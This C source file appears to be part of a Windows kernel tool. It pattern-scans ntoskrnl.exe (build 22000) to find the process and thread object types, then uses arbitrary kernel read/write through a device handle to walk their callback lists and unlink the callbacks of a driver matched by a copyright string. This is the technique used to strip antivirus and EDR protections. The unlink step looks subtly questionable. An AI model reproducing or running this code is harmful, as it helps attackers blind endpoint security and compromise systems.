#include "struct.h"

	/*
	 *	3: kd> dt _object_type
	 *	nt!_OBJECT_TYPE
	 *		+0x000 TypeList         : _LIST_ENTRY
	 *		+0x010 Name             : _UNICODE_STRING
	 *		+0x020 DefaultObject    : Ptr64 Void
	 *		+0x028 Index            : UChar
	 *		+0x02c TotalNumberOfObjects : Uint4B
	 *		+0x030 TotalNumberOfHandles : Uint4B
	 *		+0x034 HighWaterNumberOfObjects : Uint4B
	 *		+0x038 HighWaterNumberOfHandles : Uint4B
	 *		+0x040 TypeInfo         : _OBJECT_TYPE_INITIALIZER
	 *		+0x0b8 TypeLock         : _EX_PUSH_LOCK
	 *		+0x0c0 Key              : Uint4B
	 *		+0x0c8 CallbackList     : _LIST_ENTRY
	 *		
	 * 
	 *	typedef struct _OBCALLBACK
	 *	{
	 *		LIST_ENTRY ListEntry'
	 *		ULONGLONG uk0;
	 *		HANDLE ObHandle;
	 *		PVOID ObTypeAddr;
	 *		PVOID PreFunc;
	 *		PVOID postFunc;
	 *	}
	 */

UCHAR PTRN_W10_PsProcessObject[] = { 0x48,0x8b,0xf8,0x41,0x0f,0xb6,0xd7,0x48,0x8b,0xd };
UCHAR PTRN_W10_PsThreadObject[] = { 0x44,0x8a,0xc9,0x4c,0x8b,0xc6,0xe8 };
void InitProcessObject(PINFORMATION pInfor)
{
	switch (pInfor->Build)
	{
	case 22000:
		pInfor->Notify.ModuleName = "ntoskrnl.exe";
		pInfor->Notify.Pattern = PTRN_W10_PsProcessObject;
		pInfor->Notify.dwPattern = sizeof(PTRN_W10_PsProcessObject);
		pInfor->Notify.offset = -30;
		pInfor->Notify.startFunc = "MmUnmapViewOfSection";
		pInfor->Notify.endFunc = "IoCreateDevice";
		pInfor->CallbackListOffset = 0xc8;
		break;
	default:
		break;
	}
}
void InitThreadObject(PINFORMATION pInfor)
{
	switch (pInfor->Build)
	{
	case 22000:
		pInfor->Notify.ModuleName = "ntoskrnl.exe";
		pInfor->Notify.Pattern = PTRN_W10_PsThreadObject;
		pInfor->Notify.dwPattern = sizeof(PTRN_W10_PsThreadObject);
		pInfor->Notify.offset = -38;
		pInfor->Notify.startFunc = "ObSetHandleAttributes";
		pInfor->Notify.endFunc = "RtlCreateAcl";
		pInfor->CallbackListOffset = 0xc8;
		break;
	default:
		break;
	}
}
BOOL EnumObCallBackFunction(HANDLE hDevice, PWSTR Copyright, ULONG_PTR CallbackListAddr, ULONG_PTR CurrentObAddr)
{
	BOOL status = FALSE;
	ULONG_PTR pre, post;
	ULONG_PTR PreFunc, PostFunc;
	ULONG_PTR ObTypeAddr;

	if (UtilReadKernelMemory(hDevice, CallbackListAddr, &pre) && UtilReadKernelMemory(hDevice, CallbackListAddr + 8, &post))
	{
		if (UtilReadKernelMemory(hDevice, pre + (4 * sizeof(PVOID)), &ObTypeAddr) && (ObTypeAddr == CurrentObAddr))
		{
			do
			{
				if (UtilReadKernelMemory(hDevice, pre + (5 * sizeof(PVOID)), &PreFunc) && UtilReadKernelMemory(hDevice, pre + (6 * sizeof(PVOID)), &PostFunc))
				{
					if (checkDriver(hDevice, 0, PreFunc, Copyright, NULL, FALSE) || checkDriver(hDevice, 0, PostFunc, Copyright, NULL, FALSE))
					{
						status = TRUE;
						break;
					}
				}
				UtilReadKernelMemory(hDevice, pre, &pre);
				UtilReadKernelMemory(hDevice, pre + (4 * sizeof(PVOID)), &ObTypeAddr);
			} while ((pre != CallbackListAddr) && (ObTypeAddr == CurrentObAddr));

		}
	}
	return status;
}

void DeleteObCallBackList(void(*callback)(void* info), PINFORMATION pInfor, PWSTR Copyright, PWSTR typeName)
{
	NTSTATUS status;
	ULONG_PTR ListStart, pre, uSting;
	ULONG_PTR ListPre, ListPost;
	BYTE type[16] = { 0 };

	callback(pInfor);

	if (!moduleInfos)
	{
		status = enumDriver();
		if (!NT_SUCCESS(status))
		{
			PRINT_ERROR(L"enumDriver %08x\n", status);
			return;
		}
	}

	if (needSort)
		SortDevice();

	if (GetGlobalAddress(pInfor->Notify.ModuleName, pInfor->Notify.startFunc, pInfor->Notify.endFunc, pInfor->Notify.Pattern, pInfor->Notify.dwPattern, pInfor->Notify.offset, &ListStart))
	{
		
		if (UtilReadKernelMemory(pInfor->hDevice, ListStart, &ListStart))
		{
			UtilReadKernelMemory(pInfor->hDevice, ListStart + 0x10 + 0x8, &uSting);
			UtilReadKernelMemory(pInfor->hDevice, uSting, (ULONG_PTR*)type);
			UtilReadKernelMemory(pInfor->hDevice, uSting + 8, (ULONG_PTR*)(type + 8));
			if (!_wcsicmp((PWSTR)type, typeName))
			{
				wprintf(L"[*] Ps%wsType @ %I64X\n", typeName, ListStart);
				if (UtilReadKernelMemory(pInfor->hDevice, ListStart, &pre))
				{
					do
					{
						if (EnumObCallBackFunction(pInfor->hDevice, Copyright, pre + pInfor->CallbackListOffset, pre))
						{
							UtilReadKernelMemory(pInfor->hDevice, pre, &ListPre);
							UtilReadKernelMemory(pInfor->hDevice, pre + 8, &ListPost);
							UtilWriteKernelMemory(pInfor->hDevice, ListPre + 8, ListPost);
							UtilWriteKernelMemory(pInfor->hDevice, ListPost, ListPre);
						}
						UtilReadKernelMemory(pInfor->hDevice, pre, &pre);
					} while (pre != ListStart);

				}
			}
		}
	}
}